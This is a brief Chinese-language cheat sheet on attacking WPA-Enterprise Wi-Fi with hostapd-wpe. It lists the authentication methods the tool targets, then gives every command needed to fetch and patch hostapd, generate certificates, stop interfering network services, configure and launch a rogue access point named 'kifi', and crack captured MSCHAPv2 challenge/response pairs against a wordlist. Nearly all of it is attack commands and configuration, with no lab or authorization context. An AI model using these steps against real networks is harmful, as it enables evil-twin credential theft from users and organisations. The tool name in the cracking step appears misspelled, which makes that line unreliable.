
# wpa企业攻击

* hostapd-wpe


## hostapd-wpe

> 取代了FreeRADIUS-wpe  
> EAP-FAST/MSCHAPv2  
> PEAP/MSCHAPv2  
> EAP-TTLS/MSCHAPv2  
> EAP-TTLS/MSCHAP  
> EAP-TTLS/CHAP  
> EAP-TTLS/PAP  

```shell 
    1. GIT CLONE https://github.com/OpenSecurityResearch/hostapd-wpe
    2. apt-get install libssl-dev libnl-dev
    3. wget http://hostap.epitest.fi/releases/hostapd-2.2.tar.gz
    4. tar zxvf hostapd-2.2.tar.gz
    5. cd hostapd-2.2
    6. patch -p1 < ../hostapd-wpe/hostapd-wpe.patch
    7. cd hostapd
    8. make
    9. 生成证书
        cd ../../hostapd-wpe/certs
        ./bootstrap
    #(虚拟机 映射usb无线网卡之前) 10. service network-manager stop
    # 11. airmon-ng check kill
    # 12. 映射无线网卡
        ifconfig wlan0 up
    13. 启动伪造AP
        cd ../../hostapd-2.2/hostapd 
        vi hostapd-wpe.conf
            # interface=eth0
            interface=wlan0
            # driver=wired
            driver = nl80211
            ssid=kifi
            hw_mode=g
			channel=11
					
        ./hostapd-wpe hostapd-wpe.conf
	14. 密码破解
        aslecp -C challenge -R response -w <Dictionary File>
```
